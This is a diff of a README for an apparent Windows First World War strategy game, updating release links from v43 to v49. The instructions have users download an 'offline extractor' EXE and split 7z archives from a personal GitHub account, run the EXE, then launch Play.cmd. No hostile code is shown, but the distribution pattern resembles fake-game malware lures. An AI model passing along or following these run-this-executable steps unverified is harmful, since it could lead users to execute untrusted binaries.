@@ -6,9 +6,9 @@ A cinematic First World War trench strategy game for Windows. Lead British or Ge
 
 Download **all three files** below from the same release:
 
-1. [Warfare-Front-v43-Windows-x64.exe](https://github.com/ShoWTimETheKey/Warfare-Front/releases/download/v43/Warfare-Front-v43-Windows-x64.exe) — offline extractor.
-2. [Warfare-Front-v43-Windows-x64.7z.001](https://github.com/ShoWTimETheKey/Warfare-Front/releases/download/v43/Warfare-Front-v43-Windows-x64.7z.001) — game data, part 1.
-3. [Warfare-Front-v43-Windows-x64.7z.002](https://github.com/ShoWTimETheKey/Warfare-Front/releases/download/v43/Warfare-Front-v43-Windows-x64.7z.002) — game data, part 2.
+1. [Warfare-Front-v49-Windows-x64.exe](https://github.com/ShoWTimETheKey/Warfare-Front/releases/download/v49/Warfare-Front-v49-Windows-x64.exe) — offline extractor.
+2. [Warfare-Front-v49-Windows-x64.7z.001](https://github.com/ShoWTimETheKey/Warfare-Front/releases/download/v49/Warfare-Front-v49-Windows-x64.7z.001) — game data, part 1.
+3. [Warfare-Front-v49-Windows-x64.7z.002](https://github.com/ShoWTimETheKey/Warfare-Front/releases/download/v49/Warfare-Front-v49-Windows-x64.7z.002) — game data, part 2.
 
 Keep them in **one folder with these exact filenames**. After all downloads finish, double-click the download EXE, choose a writable destination and select **Extract**. Open the extracted game folder and double-click **Play.cmd**. Keep its supplied folders together. Allow free space for both the downloads and the extracted game.
 
